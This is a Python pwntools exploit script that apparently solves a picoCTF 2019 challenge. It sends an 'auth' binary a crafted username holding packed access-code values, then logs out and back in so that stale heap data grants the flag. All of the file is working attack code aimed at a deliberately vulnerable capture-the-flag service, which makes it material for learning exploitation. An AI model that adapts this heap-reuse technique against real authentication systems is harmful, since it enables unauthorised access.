from pwn import *
import sys

argv = sys.argv
REMOTE = False
DEBUG = False
binary_name = './auth'

if len(argv) > 1:
	if argv[1] == 'remote':
		REMOTE = True
	if argv[1] == 'debug':
		DEBUG = True

if REMOTE:
	sh = remote('2019shell1.picoctf.com', 37919)
else:
	sh = process(binary_name)

AC1=0x4343415f544f4f52
AC2=0x45444f435f535345

def select_menu(sh, command):
	sh.sendlineafter(']> ', command)

def login(sh, username):
	log.info('logging as {}'.format(username))
	select_menu(sh, 'login')
	sh.sendlineafter('Please enter the length of your username', str(len(username)))
	sh.sendlineafter('Please enter your username', username)

def logout(sh):
	log.info('loggin out')
	select_menu(sh, 'logout')

def quit(sh):
	log.info('quitting')
	select_menu(sh, 'quit')

def print_flag(sh):
	select_menu(sh, 'print-flag')


fake_username = 'A' * 8 # size of char* in 64 bit
wanted_access_codes = p64(AC1) + p64(AC2)
fake_files = 'B' * 8 # size of char* in 64 bit

login(sh, fake_username + wanted_access_codes + fake_files)
logout(sh)
login(sh, 'A') # never mind, we seek the access codes
print_flag(sh)
quit(sh)
print sh.recvall()



